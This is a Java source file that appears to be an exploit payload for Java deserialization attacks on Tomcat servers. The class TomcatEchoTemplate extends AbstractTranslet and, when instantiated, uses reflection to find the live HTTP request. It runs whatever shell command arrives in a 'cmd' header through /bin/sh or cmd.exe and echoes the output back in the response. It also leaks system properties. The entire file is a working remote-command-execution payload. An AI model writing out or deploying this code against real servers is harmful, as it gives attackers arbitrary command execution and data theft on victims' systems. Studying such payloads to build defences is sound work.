package com.example.servletdemo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

public class TomcatEchoTemplate extends AbstractTranslet {
    public TomcatEchoTemplate() {
        try {
            boolean var4 = false;
            Thread[] var5 = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
            for (int var6 = 0; var6 < var5.length; var6++) {
                Thread var7 = var5[var6];
                if (var7 != null) {
                    String var3 = var7.getName();
                    if (!var3.contains("exec") && var3.contains("http")) {
                        Object var1 = getFV(var7, "target");
                        if (var1 instanceof Runnable) {
                            try {
                                var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                            } catch (Exception var13) {}
                            List var9 = (List)getFV(var1, "processors");
                            for (int var10 = 0; var10 < var9.size(); var10++) {
                                Object var11 = var9.get(var10);
                                var1 = getFV(var11, "req");
                                Object var2 = var1.getClass().getMethod("getResponse", new Class[0]).invoke(var1, new Object[0]);
                                var3 = (String)var1.getClass().getMethod("getHeader", new Class[] { String.class }).invoke(var1, new Object[] { "Testecho" });
                                if (var3 != null && !var3.isEmpty()) {
                                    var2.getClass().getMethod("setStatus", new Class[] { int.class }).invoke(var2, new Object[] { new Integer(200) });
                                    var2.getClass().getMethod("addHeader", new Class[] { String.class, String.class }).invoke(var2, new Object[] { "Testecho", var3 });
                                    var4 = true;
                                }
                                var3 = (String)var1.getClass().getMethod("getHeader", new Class[] { String.class }).invoke(var1, new Object[] { "cmd" });
                                if (var3 != null && !var3.isEmpty()) {
                                    var2.getClass().getMethod("setStatus", new Class[] { int.class }).invoke(var2, new Object[] { new Integer(200) });
                                    (new String[3])[0] = "cmd.exe";
                                    (new String[3])[1] = "/c";
                                    (new String[3])[2] = var3;
                                    (new String[3])[0] = "/bin/sh";
                                    (new String[3])[1] = "-c";
                                    (new String[3])[2] = var3;
//                                    String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[3] : new String[3];
                                    String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", var3} : new String[]{"/bin/sh", "-c",  var3};
                                    writeBody(var2, (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                                    var4 = true;
                                }
                                if ((var3 == null || var3.isEmpty()) && var4)
                                    writeBody(var2, System.getProperties().toString().getBytes());
                                if (var4)
                                    break;
                            }
                            if (var4)
                                break;
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void writeBody(Object var0, byte[] var1) throws Exception {
        try {
            Class<?> var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            Object var2 = var3.newInstance();
            var3.getDeclaredMethod("setBytes", new Class[] { byte[].class, int.class, int.class }).invoke(var2, new Object[] { var1, new Integer(0), new Integer(var1.length) });
            var0.getClass().getMethod("doWrite", new Class[] { var3 }).invoke(var0, new Object[] { var2 });
        } catch (NoSuchMethodException var5) {
            Class<?> var3 = Class.forName("java.nio.ByteBuffer");
            Object var2 = var3.getDeclaredMethod("wrap", new Class[] { byte[].class }).invoke(var3, new Object[] { var1 });
            var0.getClass().getMethod("doWrite", new Class[] { var3 }).invoke(var0, new Object[] { var2 });
        }
    }

    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class<?> var3 = var0.getClass();
        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }
        if (var2 == null)
            throw new NoSuchFieldException(var1);
        var2.setAccessible(true);
        return var2.get(var0);
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
